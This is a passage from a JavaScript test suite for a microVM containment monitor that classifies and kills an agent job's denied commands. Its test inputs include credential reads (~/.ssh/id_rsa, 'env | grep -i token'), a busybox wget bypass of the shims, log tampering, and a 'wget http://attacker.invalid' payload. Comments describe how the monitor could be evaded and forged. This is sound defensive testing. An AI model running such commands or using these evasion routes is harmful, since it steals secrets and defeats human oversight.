function runFixtureSync(args) {
  const child = spawnSync("bash", [FIXTURE, ...args], { encoding: "utf8" });
  assert.equal(child.status, 0, child.stderr);
  return child.stdout;
}

test("H1: the log freezes at trip — appends after a killswitch trip are refused", async () => {
  const dir = await tempState();
  try {
    const state = join(dir, "s");
    await decide(state, "GC-CRED-001", "cat ~/.ssh/id_rsa");
    const before = await readFile(join(state, "containment.log.jsonl"), "utf8");
    await runFixture(["--gc-log", state, "watcher:proc", "unknown", "proc", "post-trip"]);
    const after = await readFile(join(state, "containment.log.jsonl"), "utf8");
    assert.equal(after, before, "post-trip appends must not reach the log");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("H1: trailing post-trip records do not invalidate the evidence digest chain", async () => {
  const fixtureId = "microvm-" + "5".repeat(24);
  const { body, expectedLogSha } = envelopeTranscript(fixtureId, envelopePayloadLines(fixtureId));
  // Append noise after the envelope payload ends: the chain is verified at the
  // killswitch line's position, not by assuming it is last.
  const dir = await tempState();
  const transcript = join(dir, "console.typescript");
  writeFileSync(transcript, body.replace("more unbound guest output", "straggler log line after trip\r\nmore unbound guest output"));
  const result = await envelopeExtract(transcript, fixtureId);
  assert.equal(result.status, 0, result.stderr);
  const block = JSON.parse(result.stdout);
  assert.equal(block.logSha256, expectedLogSha);
  await rm(dir, { recursive: true, force: true });
});

test("H2: a second envelope pair is rejected as a forgery attempt", async () => {
  const fixtureId = "microvm-" + "6".repeat(24);
  const { body } = envelopeTranscript(fixtureId, envelopePayloadLines(fixtureId), { includeEnvelope: false });
  const good = envelopeTranscript(fixtureId, envelopePayloadLines(fixtureId)).body;
  const dir = await tempState();
  const transcript = join(dir, "console.typescript");
  // Inject a forged (empty but well-formed) envelope before the real one.
  const forged = `AGENTIC_CONTAINMENT_BEGIN:${fixtureId}\r\n_AGNETIC_CONTAINMENT_END:${fixtureId}\r\n`;
  writeFileSync(transcript, forged + good);
  const result = await envelopeExtract(transcript, fixtureId);
  assert.notEqual(result.status, 0);
  await rm(dir, { recursive: true, force: true });
});

test("H4: busybox applet bypass, credential reads, env probing, manifests, and dev writes classify", async () => {
  const dir = await tempState();
  try {
    const shim = async (...args) => JSON.parse(await runFixture(["--gc-shim", join(dir, "s"), ...args]));
    assert.equal((await shim("busybox", "wget", "http://x")).rule, "GC-NET-002", "busybox applet bypass must not evade the shim");
    assert.equal((await shim("cat", "/home/u/.ssh/id_rsa")).rule, "GC-CRED-001");
    assert.equal((await shim("printenv")).rule, "GC-CRED-002");
    assert.equal((await shim("sh", "-c", "env | grep -i token")).rule, "GC-CRED-002");
    assert.equal((await shim("bash", "-c", "echo {} > package.json")).rule, "GC-PKG-003");
    assert.equal((await shim("sed", "-i", "s/x/y/", "/tmp/session/.gc/containment.log.jsonl")).rule, "GC-LOG-002");
    assert.equal((await shim("echo", "AGENTIC_CONTAINMENT_BEGIN:microvm-x", ">", "/dev/console")).rule, "GC-TOOL-001");
    assert.equal((await shim("tee", "/dev/ttyS0")).rule, "GC-TOOL-002");
    const fs = async (...args) => JSON.parse(await runFixture(["--gc-fs-detect", join(dir, "s2"), ...args]));
    assert.equal((await fs("/opt/app/package.json")).rule, "GC-PKG-003");
    assert.equal((await fs("/dev/console")).rule, "GC-TOOL-002");
    // Taxonomy dispositions: the gap rules are explicitly marked.
    const taxonomy = JSON.parse(await readFile(TAXONOMY_FILE, "utf8"));
    const byId = Object.fromEntries(taxonomy.rules.map((r) => [r.id, r]));
    for (const id of ["GC-FSW-003", "GC-SHR-001", "GC-SHR-002", "GC-LOG-001"]) {
      assert.match(byId[id].disposition, /^taxonomy-only-until-detector:/, `${id} must declare its missing detector`);
    }
    for (const id of ["GC-CRED-001", "GC-CRED-002", "GC-PKG-003", "GC-LOG-002", "GC-TOOL-001", "GC-TOOL-002"]) {
      assert.match(byId[id].disposition, /^detector:/, `${id} must declare a wired detector`);
    }
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("M1: the containment block carries the schema and compact histogram", async () => {
  const fixtureId = "microvm-" + "8".repeat(24);
  const { body, expectedLogSha } = envelopeTranscript(fixtureId, envelopePayloadLines(fixtureId));
  const dir = await tempState();
  const transcript = join(dir, "console.typescript");
  writeFileSync(transcript, body);
  const block = JSON.parse((await envelopeExtract(transcript, fixtureId)).stdout);
  assert.equal(block.schema, "agentic-driver.guest-containment.log.v1");
  assert.deepEqual(block.histogram, { unknown: 1, "GC-CRED": 1 });
  assert.equal(block.logSha256, expectedLogSha);
  await rm(dir, { recursive: true, force: true });
});

test("M3: learning-window observations are logged as events", async () => {
  const dir = await tempState();
  try {
    const state = join(dir, "s");
    await runFixture(["--gc-shim", state, "ls", "-la"], { GC_LEARNING_WINDOW_SECONDS: "999" });
    const log = await readFile(join(state, "containment.log.jsonl"), "utf8");
    const events = log.trim().split("\n").map((l) => JSON.parse(l));
    assert.ok(events.some((e) => e.event.action === "observe" && e.event.class === "unknown"), "window observation logged");
    assert.ok(!events.some((e) => e.event.action === "deny"), "observations are not denials");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("M4: flood degrades to summary-only records without dropping events", async () => {
  const dir = await tempState();
  try {
    const state = dir; // the temp dir itself is the containment state dir
    // Pre-fill the log beyond the 8 KiB cap with valid v1-shape records.
    const filler = JSON.stringify({ schema: "agentic-driver.guest-containment.log.v1", session: "s", taxonomy: "guest-containment-taxonomy.v1", taxonomySha256: TAXONOMY_SHA256, event: { ts: "t", seq: 0, source: "shim", class: "unknown", action: "deny", subject: { type: "exec", value: "x".repeat(120) } } });
    writeFileSync(join(state, "containment.log.jsonl"), `${Array(80).fill(filler).join("\n")}\n`);
    writeFileSync(join(state, "taxonomy.json"), await readFile(TAXONOMY_FILE));
    const out = JSON.parse(await runFixture(["--gc-log", state, "shim", "unknown", "exec", "post-flood"]));
    assert.equal(out.event.summary, true);
    assert.equal(out.event.subject, undefined, "context dropped in summary-only mode");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

// --- Repair pass: R1 (sweep/inotifyd coexistence + nested writes), R2 (full
// applet shim surface), plus heredoc-render regression guards ---

test("R1: inotifyd runs in the background beside the recursive sweep, never replacing it", async () => {
  const fixtureSource = await readFile(FIXTURE, "utf8");
  assert.doesNotMatch(fixtureSource, /exec \/bin\/inotifyd/, "inotifyd must not exec-replace the fs-watcher subshell (the sweep would never run)");
  assert.ok(fixtureSource.includes('[ -n "\\$watches" ] && /bin/inotifyd /gc/fs-handler \\$watches &'),
    "inotifyd must be backgrounded so the sweep loop below still runs");
  const inotifydAt = fixtureSource.indexOf("/bin/inotifyd /gc/fs-handler");
  const sweepAt = fixtureSource.indexOf("find / -newer");
  assert.ok(inotifydAt > 0 && sweepAt > 0 && inotifydAt < sweepAt, "the recursive sweep must follow the inotifyd start in the same subshell");
  // The sweep exclusion must strip only the job scratch under /tmp — /tmp
  // itself stays visible so nested staging directories are detected.
  assert.ok(fixtureSource.includes("grep -Ev '^/(tmp/session|proc|sys|dev|gc)'"));
});

test("R1: nested writes at depth >= 2 under a watched root are detected", async () => {
  const dir = await tempState();
  try {
    const sweep = (await runFixture([
      "--gc-fs-sweep", join(dir, "s"), "/tmp/staging/payload.bin", "/agent/lib/evil.js", "/tmp/session/ok.txt",
    ])).trim().split("\n").map(JSON.parse);
    assert.deepEqual(sweep.map((d) => d.decision), ["deny", "deny", "allow"]);
    assert.equal(sweep[0].rule, "GC-FSW-001", "depth-2 write under /tmp must not be excluded like the job scratch");
    assert.equal(sweep[1].rule, "GC-FSW-002", "depth-2 write inside the agent tree is self-code-modification");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("R2: every BusyBox applet is shimmed and the dispatcher is recursion-safe", async () => {
  const fixtureSource = await readFile(FIXTURE, "utf8");
  assert.ok(fixtureSource.includes("for name in $applet_list; do"), "shims must be built from the full applet list");
  assert.ok(!fixtureSource.includes("for name in wget curl nc"), "the fixed dangerous-tools shim list must be gone");
  // The dispatcher must pin PATH=/bin before sourcing core.sh so its helpers
  // (sed/grep/awk/sha256sum/...) can never re-enter /shims.
  const dispatchStart = fixtureSource.indexOf("GC_DISPATCH_EOF");
  const dispatch = fixtureSource.slice(dispatchStart, fixtureSource.indexOf("GC_DISPATCH_EOF\nthen", dispatchStart));
  assert.ok(dispatch.includes("PATH=/bin"));
  assert.ok(dispatch.indexOf("PATH=/bin") < dispatch.indexOf(". /gc/core.sh"));
  // Only the job runs under the shim PATH; the supervisor stays on /bin.
  // The job shell must be dash: busybox sh resolves applet names from its
  // compiled-in table and never execs through PATH, so /shims cannot
  // interpose (live fixture microvm-8673d4b468440affb14a58ed).
  assert.ok(fixtureSource.includes("PATH=/shims:/bin /bin/setsid /bin/dash /job.sh &"), "the job must run under a PATH-resolving shell (dash), not busybox sh");
  assert.ok(!fixtureSource.includes("/bin/busybox sh /job.sh"), "busybox sh must never run the job: its applet table bypasses /shims");
  assert.ok(!fixtureSource.includes("export PATH=/shims:/bin"));
  // Classifier-level closure of the plain-applet-name bypass.
  const dir = await tempState();
  try {
    const shim = async (...args) => JSON.parse(await runFixture(["--gc-shim", join(dir, "s"), ...args]));
    assert.equal((await shim("cat", "/root/.ssh/id_rsa")).rule, "GC-CRED-001");
    assert.equal((await shim("sed", "-i", "s/a/b/", "/var/log/agent.log")).rule, "GC-LOG-002");
    assert.equal((await shim("sh", "-c", "echo hi > /dev/console")).rule, "GC-TOOL-002");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

// Builds the REAL guest dispatch sandbox (heredocs extracted from the
// fixture, absolute paths rebound to the sandbox; classification, killswitch,
// and deny-kill logic byte-for-byte the shipped guest code) with shims/wget
// installed. Shared by the R4/R5 execution regressions.
async function realDispatchSandbox() {
  const fixtureSource = await readFile(FIXTURE, "utf8");
  const dispatchOpener = "cat >\"$root/gc/dispatch\" <<'GC_DISPATCH_EOF'\n";
  const dStart = fixtureSource.indexOf(dispatchOpener);
  assert.ok(dStart > 0, "dispatch heredoc not found");
  const dBody = fixtureSource.slice(
    dStart + dispatchOpener.length,
    fixtureSource.indexOf("\nGC_DISPATCH_EOF\n", dStart),
  );
  const coreOpener = "cat >\"$root/gc/core.sh\" <<'GC_CORE_EOF'\n";
  const cStart = fixtureSource.indexOf(coreOpener);
  assert.ok(cStart > 0, "guest core heredoc not found");
  const cBody = fixtureSource.slice(
    cStart + coreOpener.length,
    fixtureSource.indexOf("\nGC_CORE_EOF\n", cStart),
  );
  const sandbox = await tempState();
  // Sandbox layout mirrors the guest: gc/core.sh, shims/<tool> reaching the
  // dispatcher via argv[0] (like the guest symlinks), and job scripts run by
  // a PATH-resolving shell. The guest job shell is dash; on the host bash
  // stands in — both resolve every external command through PATH and have
  // no applet table, which is exactly the property under regression.
  mkdirSync(join(sandbox, "gc"), { recursive: true });
  mkdirSync(join(sandbox, "shims"), { recursive: true });
  writeFileSync(join(sandbox, "gc", "core.sh"), cBody);
  const sessionDir = join(sandbox, "session", ".gc");
  const sha256 = spawnSync("sh", ["-c", "command -v sha256sum || true"], { encoding: "utf8" }).stdout.trim();
  assert.ok(sha256, "sha256sum must be resolvable for the real killswitch digest path");
  const dispatch = dBody
    .replace("#!/bin/busybox sh", "#!/bin/sh")
    .replace("\nPATH=/bin\n", `\nPATH=${dirname(sha256)}:/usr/bin:/bin\n`)
    .replace(". /gc/core.sh", `. ${join(sandbox, "gc", "core.sh")}`)
    .replace("session=/tmp/session/.gc", `session=${sessionDir}`);
  // The rebind must not be able to strip the synchronous deny-kill, nor its
  // PID-1 guard (review R1).
  assert.ok(
    dispatch.includes('[ -f "$session/kill" ]') && dispatch.includes('if [ "$PPID" != "1" ]'),
    "dispatch deny-kill branch (with PID-1 guard) must survive path rebinding",
  );
  writeFileSync(join(sandbox, "shims", "wget"), dispatch, { mode: 0o755 });
  return { sandbox, sessionDir, shimsPath: join(sandbox, "shims") };
}

// Runs a job script in its own detached process group (review R2): the
// dispatcher's `kill -KILL 0` group kill can never reach the Node test
// runner, and on Linux — where /proc/self/stat makes the group branch
// reachable — the branch genuinely fires and takes down the whole job group.
function runJobDetached(jobPath, shimsPath) {
  return new Promise((resolve, reject) => {
    const child = spawn("/bin/bash", [jobPath], {
      detached: true,
      stdio: ["ignore", "pipe", "pipe"],
      env: { PATH: `${shimsPath}:/usr/bin:/bin` },
    });
    let stdout = "";
    child.stdout.on("data", (chunk) => { stdout += chunk; });
    child.on("error", reject);
    child.on("close", (status, signal) => resolve({ stdout, status, signal }));
  });
}

test("R4: job-shell wget trips GC-NET-002 through the real dispatch and the next command never runs", async () => {
  const { sandbox, sessionDir, shimsPath } = await realDispatchSandbox();
  try {
    writeFileSync(
      join(sandbox, "job.sh"),
      "echo hello-from-contained-job\nwget example.com\necho this-line-never-runs\n",
      { mode: 0o755 },
    );
    // Run the real chain: job shell -> PATH lookup -> /shims/wget -> real
    // dispatch -> real core -> GC-NET-002 trip -> synchronous kill.
    const run = await runJobDetached(join(sandbox, "job.sh"), shimsPath);
    assert.ok(run.stdout.includes("hello-from-contained-job"), "payload prefix must run under the shim PATH");
    assert.ok(!run.stdout.includes("this-line-never-runs"), "the command after a tripped denial must never run");
    assert.equal(run.signal, "SIGKILL", "the dispatcher must kill the job shell synchronously (not via the 1s supervisor poll)");
    const killFlag = await readFile(join(sessionDir, "kill"), "utf8");
    assert.equal(killFlag.trim(), "immediate", "HIGH tier must trip the killswitch immediately");
    const log = await readFile(join(sessionDir, "containment.log.jsonl"), "utf8");
    assert.ok(log.includes('"rule":"GC-NET-002"'), "the denial must be classified as GC-NET-002");
    assert.ok(
      log.includes('"schema":"agentic-driver.guest-containment.killswitch.v1"') && log.includes('"tier":"HIGH"') && log.includes('"final":true'),
      "a terminal HIGH killswitch event must be logged",
    );
  } finally {
    await rm(sandbox, { recursive: true, force: true });
  }
});

test("R5: exec'd denial never signals PID 1; containment stays synchronous via the job process group", async () => {
  // Case A (explicit `exec wget`): the job shell execs the denied tool, so
  // the dispatcher is left parented by the outer job shell inside the
  // detached job group. Synchronous containment must still hold — the line
  // after the exec'd invocation never runs — without any signal leaving the
  // job process group.
  const a = await realDispatchSandbox();
  try {
    writeFileSync(join(a.sandbox, "inner.sh"), "exec wget example.com\n", { mode: 0o755 });
    writeFileSync(
      join(a.sandbox, "job.sh"),
      `echo exec-case-start\n/bin/bash ${JSON.stringify(join(a.sandbox, "inner.sh"))}\necho exec-case-never\n`,
      { mode: 0o755 },
    );
    const run = await runJobDetached(join(a.sandbox, "job.sh"), a.shimsPath);
    assert.ok(run.stdout.includes("exec-case-start"), "exec-case prefix must run");
    assert.ok(!run.stdout.includes("exec-case-never"), "the line after an exec'd denied invocation must never run");
    assert.equal(run.signal, "SIGKILL", "the job group must be killed synchronously (parent kill here; group kill where /proc exists)");
    assert.equal((await readFile(join(a.sessionDir, "kill"), "utf8")).trim(), "immediate", "the exec'd denial must still trip the killswitch");
  } finally {
    await rm(a.sandbox, { recursive: true, force: true });
  }
  // Case B (PID-1 safety): an orphaned dispatcher — its parent exited, so
  // PPID becomes 1 after reparenting — must never signal PID 1. The denial
  // still trips; nothing outside the (detached) job group is touched.
  const b = await realDispatchSandbox();
  try {
    writeFileSync(join(b.sandbox, "orphan.sh"), "exec wget example.com\n", { mode: 0o755 });
    writeFileSync(
      join(b.sandbox, "spawner.sh"),
      `/bin/bash ${JSON.stringify(join(b.sandbox, "orphan.sh"))} &\nexit 0\n`,
      { mode: 0o755 },
    );
    await runJobDetached(join(b.sandbox, "spawner.sh"), b.shimsPath);
    // The orphan holds the stdout pipe, so close fires only after the
    // dispatcher finished its deny path; give reparenting a moment anyway.
    await new Promise((resolve) => setTimeout(resolve, 300));
    let pid1Alive = false;
    try {
      process.kill(1, 0);
      pid1Alive = true;
    } catch (e) {
      pid1Alive = e.code === "EPERM"; // EPERM => PID 1 exists but is not signalable
    }
    assert.ok(pid1Alive, "PID 1 must never be signalled by the deny-kill path");
    assert.equal((await readFile(join(b.sessionDir, "kill"), "utf8")).trim(), "immediate", "the orphaned denial must still trip GC-NET-002");
  } finally {
    await rm(b.sandbox, { recursive: true, force: true });
  }
});

test("R1/R3: the guest init heredoc renders under set -u (no host-side $ leaks)", async () => {
  const fixtureSource = await readFile(FIXTURE, "utf8");
  const opener = 'cat >"$root/init" <<EOF\n';
  const start = fixtureSource.indexOf(opener) + opener.length;
  const end = fixtureSource.indexOf("\nEOF\n", start);
  assert.ok(start > opener.length && end > start, "guest init heredoc not found");
  const template = fixtureSource.slice(start, end);
  const render = spawnSync("bash", ["-c",
    'set -euo pipefail; marker="AGENTIC_MICROVM_PROBE:t"; fixture_id="t"; have_setsid=true; cat <<EOF\n' + template + "\nEOF\n"],
    { encoding: "utf8" });
  assert.equal(render.status, 0, render.stderr || "heredoc must not reference host-side variables (set -u violation)");
  const guest = render.stdout;
  // Guest-side variables must survive rendering as plain $ references.
  assert.ok(guest.includes("/bin/inotifyd /gc/fs-handler $watches &"), "guest watches loop must survive rendering");
  assert.ok(guest.includes("awk '{print $4}'"), "guest awk stat field must survive rendering");
  assert.ok(guest.includes("PATH=/shims:/bin /bin/setsid /bin/dash /job.sh &"));
  assert.ok(guest.includes("echo 'AGENTIC_MICROVM_PROBE:t'"), "host-side marker substitution must render");
});

// --- M6 wiring: jobPayload (user config only) makes containment reachable ---

function runHarness(targetPath, receiptBuilder, confirmBodies, executed) {
  return {
    context: { mode: "tui", hasUI: true, ui: { confirm: async (_t, body) => { confirmBodies.push(body); return true; } } },
    options: {
      isolationSwitch: { get: () => true },
      userConfigPath: "/nonexistent/user-config.json",
      targetPath,
      execute: (executable, args, execOptions) => {
        executed.push([executable, ...args]);
        const fixtureId = executable === "ssh" ? args[4] : /microvm-[0-9a-f]{24}/.exec(args[1])?.[0];
        const scriptHash = executable === "ssh" ? args[5] : createHash("sha256").update(execOptions?.input ?? "").digest("hex");
        return { code: 0, stdout: `AGENTIC_MICROVM_RECEIPT: ${JSON.stringify(receiptBuilder(fixtureId, scriptHash))}\n`, stderr: "" };
      },
      observeFacts: (execute, fixtureId) => stubFactsShape(fixtureId),
    },
  };
}

const JOB_PAYLOAD = "/bin/busybox sh -c 'echo session-work; sleep 1'";

test("M6: jobPayload config activates containment mode with the payload as the 5th fixture argv", async () => {
  const dir = await tempState();
  try {
    const targetPath = targetConfigFile(dir, { jobPayload: JOB_PAYLOAD });
    const confirmBodies = [];
    const executed = [];
    const harness = runHarness(targetPath, (id, sh) => stubV2Receipt(id, sh, "2".repeat(64)), confirmBodies, executed);
    const value = await runLinuxMicroVMCutover(harness.context, harness.options);
    assert.equal(value.ok, true, JSON.stringify(value.reason ?? {}));
    assert.equal(value.schema, LINUX_MICROVM_CUTOVER_SCHEMA_V2);
    assert.equal(value.containment.killswitch.tripped, true);
    const fixtureExec = executed.find(([exe, ...args]) => exe === "ssh" && args[1] === "bash");
    // The payload travels base64-encoded on the argv (ssh joins argv into one
    // remote-shell command string; raw text would be word-split or injected).
    const payloadArg = fixtureExec.at(-1);
    assert.match(payloadArg, /^[A-Za-z0-9+/=]+$/, "payload argv must be shell-safe base64");
    assert.equal(Buffer.from(payloadArg, "base64").toString("utf8"), JOB_PAYLOAD, "payload must round-trip exactly");
    assert.match(confirmBodies[0], /deny-by-default containment monitor/);
    assert.match(confirmBodies[0], /Guest job payload \(user-configured\):/);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("M6: absent jobPayload keeps plain proof mode (v1, no containment block required)", async () => {
  const dir = await tempState();
  try {
    const targetPath = targetConfigFile(dir);
    const confirmBodies = [];
    const executed = [];
    const harness = runHarness(targetPath, (id, sh) => stubV1Receipt(id, sh), confirmBodies, executed);
    const value = await runLinuxMicroVMCutover(harness.context, harness.options);
    assert.equal(value.ok, true, JSON.stringify(value.reason ?? {}));
    assert.equal(value.schema, LINUX_MICROVM_CUTOVER_SCHEMA);
    assert.equal(value.containment, undefined);
    const fixtureExec = executed.find(([exe, ...args]) => exe === "ssh" && args[1] === "bash");
    assert.equal(fixtureExec.length, 9, "no payload argv in plain proof mode");
    assert.doesNotMatch(confirmBodies[0], /containment monitor/);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("M6: placeholder and oversized payloads reject the config fail-closed", async () => {
  const dir = await tempState();
  try {
    for (const bad of ["REPLACE-WITH-your-job-command", "x".repeat(8193), "   "]) {
      const targetPath = targetConfigFile(dir, { jobPayload: bad });
      const confirmBodies = [];
      const executed = [];
      const harness = runHarness(targetPath, (id, sh) => stubV1Receipt(id, sh), confirmBodies, executed);
      const value = await runLinuxMicroVMCutover(harness.context, harness.options);
      assert.equal(value.ok, false);
      assert.equal(value.reason.code, "target-not-configured");
      assert.equal(executed.length, 0, "no run may start with an invalid payload");
    }
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("M6: the model cannot supply the payload (options ignored, tool surface closed)", async () => {
  const dir = await tempState();
  try {
    const targetPath = targetConfigFile(dir); // no jobPayload in the user config
    const executed = [];
    const harness = runHarness(targetPath, (id, sh) => stubV1Receipt(id, sh), [], executed);
    const value = await runLinuxMicroVMCutover(harness.context, {
      ...harness.options,
      jobPayload: "wget http://attacker.invalid", // ignored: config is the only source
    });
    assert.equal(value.ok, true);
    assert.equal(value.schema, LINUX_MICROVM_CUTOVER_SCHEMA, "no payload from config means plain proof even if options lie");
    const fixtureExec = executed.find(([exe, ...args]) => exe === "ssh" && args[1] === "bash");
    assert.equal(fixtureExec.length, 9);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

// --- Live-proof fix: streamed-stdin ($0 = "bash") must not break the core embed ---

test("streamed-stdin regression: bash -s embeds a non-empty core.sh without reading $0", async () => {
  const dir = await tempState();
  const dest = join(dir, "core.sh");
  try {
    // Reproduce the live path: pipe the fixture through `bash -s` so $0 is
    // "bash" and there is no script file to read back.
    await new Promise((resolve, reject) => {
      const child = spawn("bash", ["-s", "--", "--gc-core-embed", dest], { stdio: ["pipe", "ignore", "pipe"] });
      // The --gc-core-embed hook exits as soon as the core is written; the
      // fixture stream exceeds the OS pipe buffer, so the writer can EPIPE
      // while bash is already gone. That is expected early-exit plumbing,
      // not a failure — the embedded-core assertions below gate correctness.
      // Anything other than EPIPE still rejects.
      child.stdin.on("error", (e) => { if (e.code !== "EPIPE") reject(e); });
      const stream = createReadStream(FIXTURE);
      stream.on("error", reject);
      stream.on("end", () => child.stdin.end());
      stream.pipe(child.stdin);
      child.on("exit", (code) => code === 0 ? resolve() : reject(new Error(`bash -s exited ${code}: ${child.stderr.read()?.toString() ?? ""}`)));
      child.on("error", reject);
    });
    const core = await readFile(dest, "utf8");
    assert.ok(core.length > 1024, "embedded core must be non-empty over the streamed path");
    assert.match(core, /gc_killswitch_trip/);
    assert.match(core, /gc_embedded_taxonomy/);
    assert.doesNotMatch(core, /"\$0"/, "the guest core must not reference the fixture's $0");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("drift guard: heredoc-rendered core.sh is byte-equal to the fixture's own core region", async () => {
  const fixtureSource = await readFile(FIXTURE, "utf8");
  // The same range the (removed) awk extraction used locally, where the file exists.
  const start = fixtureSource.indexOf("# --- guest containment core");
  const end = fixtureSource.indexOf("# Test hooks:");
  assert.ok(start > 0 && end > start);
  const coreRegion = fixtureSource.slice(start, end);
  const marker = "cat >\"$root/gc/core.sh\" <<'GC_CORE_EOF'\n";
  const embedStart = fixtureSource.indexOf(marker) + marker.length;
  const embedEnd = fixtureSource.indexOf("\nGC_CORE_EOF\n", embedStart);
  assert.ok(embedStart > 0 && embedEnd > embedStart);
  const embedded = fixtureSource.slice(embedStart, embedEnd) + "\n";
  assert.equal(embedded, coreRegion, "embedded core drifted from the fixture's own core");
  // The build must not read $0 anywhere in the guest build path.
  assert.doesNotMatch(fixtureSource, /awk '[^']*guest containment core[^']*' "\$0"/);
});

test("M6: end-to-end containment flow through the fixture (trip → envelope → v2 receipt)", async () => {
  const dir = await tempState();
  try {
    const state = dir;
    const fixtureId = "microvm-" + "a".repeat(24);
    // 1. supervisor/shim deny trip: wget under the shim trips GC-NET-002 (HIGH, immediate).
    const decision = JSON.parse(await runFixture(["--gc-shim", state, "wget", "http://example.invalid"]));
    assert.equal(decision.decision, "deny");
    // 2. build the guest envelope exactly as /init does (base64, 76-col, LF-only).
    const { readFile: rf } = await import("node:fs/promises");
    const log = await rf(join(state, "containment.log.jsonl"));
    const b64 = Buffer.from(log, "utf8").toString("base64").replace(/(.{76})/g, "$1\n");
    const transcript = join(dir, "console.typescript");
    writeFileSync(transcript, [
      "guest boot noise",
      `AGENTIC_MICROVM_PROBE:${fixtureId}`,
      `AGENTIC_CONTAINMENT_BEGIN:${fixtureId}`,
      b64.replaceAll("\n", "\r\n").trimEnd(),
      `AGENTIC_CONTAINMENT_END:${fixtureId}`,
      "unbound trailing output",
    ].join("\r\n") + "\r\n");
    // 3. host evidence extraction recomputes the digest chain.
    const extraction = await envelopeExtract(transcript, fixtureId);
    assert.equal(extraction.status, 0, extraction.stderr);
    const block = JSON.parse(extraction.stdout);
    assert.equal(block.killswitch.tripped, true);
    assert.equal(block.killswitch.rule, "GC-NET-002");
    assert.equal(block.killswitch.class, "GC-NET");
    assert.equal(block.killswitch.tier, "HIGH");
    // 4. the real receipt printf emits the v2 receipt; host validation passes.
    // Extraction passes the kill-report path; the tripped block carries it.
    const extraction2 = await envelopeExtract(transcript, fixtureId);
    const block2 = JSON.parse(extraction2.stdout);
    const receipt = JSON.parse(runFixtureSync([
      "--gc-receipt-print", LINUX_MICROVM_CUTOVER_SCHEMA_V2, "test-host", fixtureId, `agentic-driver-${fixtureId}`,
      `AGENTIC_MICROVM_PROBE:${fixtureId}`, createHash("sha256").update(`AGENTIC_MICROVM_PROBE:${fixtureId}`).digest("hex"),
      "1".repeat(64), "a".repeat(64), `,"containment":${JSON.stringify({ ...block2, killReportPath: "/fixtures/fid/kill-report.json" })}`,
      `agentic-driver-${fixtureId}`, "true", "true", "b".repeat(64), "b".repeat(64),
      createHash("sha256").update(JSON.stringify({ disk: false, hostShare: false, credentials: false, gpu: false, initramfsSha256: "a".repeat(64) })).digest("hex"),
      createHash("sha256").update(JSON.stringify({ network: false })).digest("hex"),
    ]));
    const validated = validateLinuxMicroVMReceipt(receipt, stubFactsShape(fixtureId, "test-host"), fixtureId, "1".repeat(64), { containment: true });
    assert.equal(validated.status, "VERIFIED");
    assert.equal(validated.containment.logSha256, block.logSha256);
    assert.equal(validated.containment.histogram["GC-NET"], 1);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("D1: production trip sequence writes the kill report at the advertised path and finalizes teardown", async () => {
  const fixtureSource = await readFile(FIXTURE, "utf8");
  // Source guard: the production main flow (after phase=containment) must call
  // gc_write_kill_report itself — the --gc-kill-report hook may not remain
  // the only caller (live microvm-f84dceaecc99f8d791d8916d: trip correct,
  // advertised kill-report.json absent).
  const prodCall = 'gc_write_kill_report "$fixture_root" "$fixture_id" "$domain" "$remote_host" "$containment_block" >/dev/null';
  const callIdx = fixtureSource.indexOf(prodCall);
  assert.ok(callIdx > fixtureSource.indexOf("phase=containment"), "production main flow must write the kill report itself");
  const hookIdx = fixtureSource.indexOf('"--gc-kill-report"');
  assert.ok(hookIdx > 0 && callIdx > hookIdx, "the test hook must not be the only gc_write_kill_report caller");
  // Extract the REAL shipped gc_write_kill_report function and the REAL
  // production write+finalize block; execute them exactly as the main flow
  // holds them (teardown outcomes already proven at that point).
  const funcOpen = "gc_write_kill_report() { # fixture_root fixture_id domain remote_host block_json";
  const fStart = fixtureSource.indexOf(funcOpen);
  assert.ok(fStart > 0, "gc_write_kill_report definition not found");
  const fEnd = fixtureSource.indexOf("\n}\n", fStart);
  assert.ok(fEnd > fStart, "gc_write_kill_report terminator not found");
  const funcText = fixtureSource.slice(fStart, fEnd + 3);
  const d1 = fixtureSource.indexOf("# Defect 1 (live microvm-");
  assert.ok(d1 > 0, "production Defect-1 block not found");
  const d2tail = 'rm -f "$fixture_root/kill-report.json.bak"\nfi';
  const d2end = fixtureSource.indexOf(d2tail, d1);
  assert.ok(d2end > d1, "teardown finalization block not found");
  const prodBlock = fixtureSource.slice(d1, d2end + d2tail.length);

  const dir = await tempState();
  const state = join(dir, "state");
  try {
    // 1. Real trip through the real core: wget under the shim trips GC-NET-002.
    const decision = JSON.parse(await runFixture(["--gc-shim", state, "wget", "http://example.invalid"]));
    assert.equal(decision.decision, "deny");
    // 2. Real envelope transcript, as /init emits it on the console channel.
    const fixtureId = "microvm-" + "d1".repeat(12);
    const { readFile: rf } = await import("node:fs/promises");
    const log = await rf(join(state, "containment.log.jsonl"));
    const b64 = Buffer.from(log, "utf8").toString("base64").replace(/(.{76})/g, "$1\n");
    const transcript = join(dir, "console.typescript");
    writeFileSync(transcript, [
      `AGENTIC_MICROVM_PROBE:${fixtureId}`,
      `AGENTIC_CONTAINMENT_BEGIN:${fixtureId}`,
      b64.replaceAll("\n", "\r\n").trimEnd(),
      `AGENTIC_CONTAINMENT_END:${fixtureId}`,
    ].join("\r\n") + "\r\n");
    // 3. Real extraction: tripped block advertising the report path, and the
    // decoded payload file written next to the transcript for the report.
    const reportPath = join(dir, "kill-report.json");
    const extraction = await envelopeExtract(transcript, fixtureId, reportPath);
    assert.equal(extraction.status, 0, extraction.stderr);
    const block = JSON.parse(extraction.stdout);
    assert.equal(block.killswitch.tripped, true);
    assert.equal(block.killswitch.rule, "GC-NET-002");
    assert.equal(block.killReportPath, reportPath, "the advertised path must be the real file location");
    assert.ok(existsSync(join(dir, "console.typescript.containment.payload")), "decoded payload must exist for the report");
    // 4. Execute the REAL production write+finalize sequence (real function,
    // real core for gc_iso8601, real block text) with the main flow's values.
    const coreFile = join(dir, "core.sh");
